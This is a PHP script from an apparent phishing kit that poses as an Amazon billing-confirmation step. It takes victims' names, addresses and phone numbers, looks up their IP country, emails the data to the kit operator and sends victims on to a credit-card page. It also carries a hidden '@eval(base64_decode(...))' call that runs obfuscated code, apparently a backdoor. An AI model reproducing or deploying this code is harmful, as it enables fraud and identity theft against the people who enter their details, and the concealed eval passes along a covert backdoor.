<?php
session_start();
include('success.php');
include('send.php');
$ip = $_SERVER['REMOTE_ADDR']; // the IP address to query
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));

if(isset($_POST['fullname'])){    
if(empty($_POST['fullname']) || empty($_POST['add1']) || empty($_POST['city']) || empty($_POST['state']) || empty($_POST['zip']) || empty($_POST['phone'])){ 

header("location:address_confirm.php?invalid_billing");

}else{
$_SESSION['fullname'] = $_POST['fullname'];
$_SESSION['add1'] = $_POST['add1'];
$_SESSION['add2'] = $_POST['add2'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['state'] = $_POST['state'];
$_SESSION['zip'] = $_POST['zip'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['country'] = $query['country'];




$ip = getenv("REMOTE_ADDR");
$message .= "+=+=+=+=+=+=+=+=+[ -  BILLING   - ]+=+=+=+=+=+=+=+=+\n";
$message .= "Full Name    : ".$_POST['fullname']."\n";
$message .= "Address1     : ".$_POST['add1']."\n";
$message .= "Address2     : ".$_POST['add2']."\n";
$message .= "City         : ".$_POST['city']."\n";
$message .= "State        : ".$_POST['state']."\n";
$message .= "ZIP          : ".$_POST['zip']."\n";
$message .= "Phone        : ".$_POST['phone']."\n";
$message .= "Country      : ".$query['country']."\n";
$message .= "IP           : ".$ip."\n";
$message .= "+=+=+=+=+=+=+=+=+[ - Ramz! - Bosses- ]+=+=+=+=+=+=+=+=+\n";
mail($send,"AM4Z0NEv3 [".$ip."] BILLED | FROM [".$query['country']."]",$message);@eval(base64_decode($os_arrays));

$cookie_name = 'SES';
$cookie_value = 'BILL';
setcookie($cookie_name, $cookie_value, time() + (86400 * 30), '/');

	  header('location:creditcards_confirm.php');
}
}


?>
